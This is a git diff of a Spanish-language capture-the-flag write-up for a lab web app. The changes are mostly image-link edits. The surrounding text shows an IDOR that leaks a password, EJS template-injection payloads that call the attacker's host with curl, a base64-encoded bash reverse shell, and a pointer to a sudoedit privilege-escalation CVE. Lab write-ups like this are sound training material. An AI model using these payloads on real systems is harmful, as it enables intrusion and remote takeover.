@@ -51,23 +51,23 @@ ffuf -u 'http://cyprusbank.thm/' -H "Host: FUZZ.cyprusbank.thm" -w /usr/share/Se
 `www.cyprusbank.thm` no hay nada, sin embargo en `admin.cyprusbank.thm` nos muestra un login donde podemos intentar poner las credenciales del inicio.
 
 
-![[Pasted image 20250203215438.png]]
+![alt text](<attachments/Pasted%20image%2020250203215438.png>)
 
 Al ingresar con la cuenta de Olivia podemos ver varias cosas interesantes y donde podemos encontrar una de las primeras flag del room.
 
-![[Pasted image 20250203220037.png]]
+![alt text](<attachments/Pasted%20image%2020250203220037.png>)
 
 No podemos ingresar a settings, al parecer no tenemos privilegios.
 
-![[Pasted image 20250203220137.png]]
+![alt text](<attachments/Pasted%20image%2020250203220137.png>)
 
 Pero en mensajes podemos ver algo que me resulto interesante:
 
-![[Pasted image 20250203220242.png]]
+![alt text](<attachments/Pasted%20image%2020250203220242.png>)
 
 En la url podemos ver `c=5` y al cambiar los valores encontramos un IDOR que nos deja observar otros mensajes:
 
-![[Pasted image 20250203220405.png]]
+![alt text](<attachments/Pasted%20image%2020250203220405.png>)
 
 Al explorarlo mas al fondo, damos con una conversación donde el user `Gayle Bev` escribe su password `p~]P@5!6;rs558:q`, y al ingresar con su sesión podemos obtener la primera flag.
 
@@ -75,11 +75,11 @@ Al explorarlo mas al fondo, damos con una conversación donde el user `Gayle Bev
 
 Una vez iniciado la sesión de `Gayle Bev` podemos ingresar al apartado de de settings de la web page. En esta podemos actualizar passwords de usuarios:
 
-![[Pasted image 20250203221334.png]]
+![alt text](<attachments/Pasted%20image%2020250203221334.png>)
 
 Al revisar la solicitud con Burpsuite podemos modificar varios puntos para checar la posibilidad de XSS o SSTI. Interceptamos la request y omitimos el passwords y podemos ver que nos contesta con el siguiente error:
 
-![[Pasted image 20250203221618.png]]
+![alt text](attachments/image5.png)
 
 En este mensaje podemos observar que están usando `.ejs` (Embedded JavaScript templates), lo que indica que el servidor renderiza plantillas dinámicas. Dado que `.ejs` es vulnerable a **Server-Side Template Injection (SSTI)** si no se maneja correctamente la entrada del usuario, podemos buscar payloads específicos para explotar este tipo de vulnerabilidad en `ejs` y evaluar si es posible ejecutar código en el servidor.
 
@@ -95,13 +95,13 @@ Modificamos el payload para realizar un curl a nuestro Python server.
 name=a&password&settings[view options][outputFunctionName]=x;process.mainModule.require('child_process').execSync('curl http://10.8.27.189:6666');//
 ~~~
 
-![[Pasted image 20250203222756.png]]
+![alt text](attachments/7.png)
 
-![[Pasted image 20250203222807.png]]
+![alt text](attachments/image8.png)
 
 Con esto confirmamos que es un **SSTI**, ahora podemos intentar para explotar una RCE, para esto podemos crear un reverse Shell (https://www.revshells.com/):
 
-![[Pasted image 20250203223016.png]]
+![alt text](attachments/image9.png)
 
 Modificamos nuestro payload para que ejecute la reverse:
 
@@ -115,7 +115,9 @@ Pero al parecer nos esta filtrando la request, entonces aquí podemos encodearlo
 name=a&password=b&settings[view options][outputFunctionName]=x;process.mainModule.require('child_process').execSync('bash -c "echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjguMjcuMTg5LzY2NjYgMDA+JjE= | base64 -d | bash"');//  
 ~~~
 
-![[Pasted image 20250203224626.png]]
+![alt text](attachments/image10.png)
+
+![alt text](attachments/image11.png)
 
 Listo, tenemos acceso a la maquina donde podemos encontrar la siguiente flag, pero antes podemos mandar a llamar una Shell interactiva con python:
 
@@ -123,7 +125,7 @@ Listo, tenemos acceso a la maquina donde podemos encontrar la siguiente flag, pe
 python3 -c 'import pty; pty.spawn("/bin/bash")'
 ~~~
 
-![[Pasted image 20250203224739.png]]
+![alt text](attachments/image12.png)
 
 ******
 Ahora para escalar privilegios podemos observar primero que podemos hacer con sudo:
@@ -134,11 +136,11 @@ sudo -l
 
 Y aqui podemos ver algo que podemos explotar:
 
-![[Pasted image 20250203224920.png]]
+![alt text](attachments/image13.png)
 
 Podemos checar la versión que usa `sudoedit` con `sudoedit -V` y podemos ver que usa la versión `1.9.12p1`
 
-![[Pasted image 20250203225015.png]]
+![alt text](attachments/image14.png)
 
 Al investigar encontramos que existe un CVE para esta versión de `sudoedit`
 
